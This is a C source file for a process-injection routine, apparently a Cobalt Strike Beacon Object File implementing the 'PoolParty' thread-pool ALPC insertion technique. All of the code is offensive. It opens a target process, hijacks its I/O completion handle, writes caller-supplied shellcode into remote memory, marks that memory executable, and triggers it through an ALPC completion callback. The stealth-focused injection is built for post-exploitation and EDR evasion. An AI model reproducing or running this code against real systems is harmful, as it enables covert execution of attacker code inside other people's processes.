#include "PoolParty.h"

#define POOL_PARTY_ALPC_PORT_NAME_PREFIX L"\\RPC Control\\"
#define PORT_NAME_LENGTH 9
#define POOL_PARTY_POEM "Dive right in and make a splash,\n" \
                        "We're throwing a pool party in a flash!\n" \
                        "Bring your swimsuits and sunscreen galore,\n" \
                        "We'll turn up the heat and let the good times pour!\n"

void RemoteTpAlpcInsertionSetupExecution(HANDLE hTarget, LPVOID pShellcodeAddress) {
        _NtAlpcCreatePort NtAlpcCreatePort = (_NtAlpcCreatePort)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAlpcCreatePort"));
        _TpAllocAlpcCompletion TpAllocAlpcCompletion = (_TpAllocAlpcCompletion)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "TpAllocAlpcCompletion"));
        _NtAlpcSetInformation NtAlpcSetInformation = (_NtAlpcSetInformation)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAlpcSetInformation"));
        _NtAlpcConnectPort NtAlpcConnectPort = (_NtAlpcConnectPort)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAlpcConnectPort"));

        MSVCRT$srand((unsigned int)MSVCRT$time(NULL));
        wchar_t* randomLetters = generateRandomLettersW(PORT_NAME_LENGTH);
        size_t prefixLength = MSVCRT$wcslen(POOL_PARTY_ALPC_PORT_NAME_PREFIX);
        size_t totalLength = prefixLength + PORT_NAME_LENGTH + 1;
        wchar_t* portName = (wchar_t*)MSVCRT$malloc((MSVCRT$wcslen(POOL_PARTY_ALPC_PORT_NAME_PREFIX) + PORT_NAME_LENGTH + 1) * sizeof(wchar_t));
        MSVCRT$wcscpy_s(portName, totalLength, POOL_PARTY_ALPC_PORT_NAME_PREFIX);
        MSVCRT$wcscat_s(portName, totalLength, randomLetters);
        wchar_t* POOL_PARTY_ALPC_PORT_NAME = portName;

        HANDLE hTempAlpcConnectionPort;
        NTSTATUS Ntstatus = NtAlpcCreatePort(&hTempAlpcConnectionPort, NULL, NULL);

        PFULL_TP_ALPC pTpAlpc = { 0 };
        Ntstatus = TpAllocAlpcCompletion(&pTpAlpc, hTempAlpcConnectionPort, (PTP_ALPC_CALLBACK)(pShellcodeAddress), NULL, NULL);

        UNICODE_STRING usAlpcPortName;
        RtlInitUnicodeString(&usAlpcPortName, POOL_PARTY_ALPC_PORT_NAME);

        OBJECT_ATTRIBUTES AlpcObjectAttributes = { 0 };
        AlpcObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
        AlpcObjectAttributes.ObjectName = &usAlpcPortName;

        ALPC_PORT_ATTRIBUTES AlpcPortAttributes = { 0 };
        AlpcPortAttributes.Flags = 0x20000;
        AlpcPortAttributes.MaxMessageLength = 328;

        HANDLE hAlpcConnectionPort;
        Ntstatus = NtAlpcCreatePort(&hAlpcConnectionPort, &AlpcObjectAttributes, &AlpcPortAttributes);

        PFULL_TP_ALPC pRemoteTpAlpc = (PFULL_TP_ALPC)(KERNEL32$VirtualAllocEx(hTarget, NULL, sizeof(FULL_TP_ALPC), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
        KERNEL32$WriteProcessMemory(hTarget, pRemoteTpAlpc, pTpAlpc, sizeof(FULL_TP_ALPC), NULL);

        ALPC_PORT_ASSOCIATE_COMPLETION_PORT AlpcPortAssociateCopmletionPort = { 0 };
        AlpcPortAssociateCopmletionPort.CompletionKey = pRemoteTpAlpc;
        AlpcPortAssociateCopmletionPort.CompletionPort = hIoCompletion;
        NtAlpcSetInformation(hAlpcConnectionPort, AlpcAssociateCompletionPortInformation, &AlpcPortAssociateCopmletionPort, sizeof(ALPC_PORT_ASSOCIATE_COMPLETION_PORT));

        OBJECT_ATTRIBUTES AlpcClientObjectAttributes = { 0 };
        AlpcClientObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);

        const char* Buffer = POOL_PARTY_POEM;
        int BufferLength = sizeof(Buffer);

        ALPC_MESSAGE ClientAlpcPortMessage = { 0 };
        ClientAlpcPortMessage.PortHeader.u1.s1.DataLength = BufferLength;
        ClientAlpcPortMessage.PortHeader.u1.s1.TotalLength = sizeof(PORT_MESSAGE) + BufferLength;
        memcpy(ClientAlpcPortMessage.PortMessage, Buffer, sizeof(ClientAlpcPortMessage.PortMessage));
        size_t szClientAlpcPortMessage = sizeof(ClientAlpcPortMessage);

        /* NtAlpcConnectPort would block forever if not used with timeout, we set timeout to 1 second */
        LARGE_INTEGER liTimeout = { 0 };
        liTimeout.QuadPart = -10000000;
        HANDLE hAlpc_;
        NtAlpcConnectPort(
                &hAlpc_,
                &usAlpcPortName,
                &AlpcClientObjectAttributes,
                &AlpcPortAttributes,
                0x20000,
                NULL,
                (PPORT_MESSAGE)&ClientAlpcPortMessage,
                &szClientAlpcPortMessage,
                NULL,
                NULL,
                &liTimeout);
}

void Inject5(DWORD dwTargetProcessId, CHAR* shellcode, SIZE_T shellcodeSize) {
        _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"));

        HANDLE hTarget = NULL;
        DWORD dwOldProtect = NULL;
        hTarget = KERNEL32$OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, dwTargetProcessId);

        if (hTarget) {
                HijackIoCompletionHandle(hTarget, IO_COMPLETION_ALL_ACCESS);
                PVOID pShellcodeAddress = KERNEL32$VirtualAllocEx(hTarget, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                NtWriteVirtualMemory(hTarget, pShellcodeAddress, shellcode, shellcodeSize, NULL);
                KERNEL32$VirtualProtectEx(hTarget, pShellcodeAddress, shellcodeSize, PAGE_EXECUTE_READ, &dwOldProtect);
                RemoteTpAlpcInsertionSetupExecution(hTarget, pShellcodeAddress);
        } else {
                BeaconPrintf(CALLBACK_OUTPUT, "PID %d inaccessible", dwTargetProcessId);
        }
}
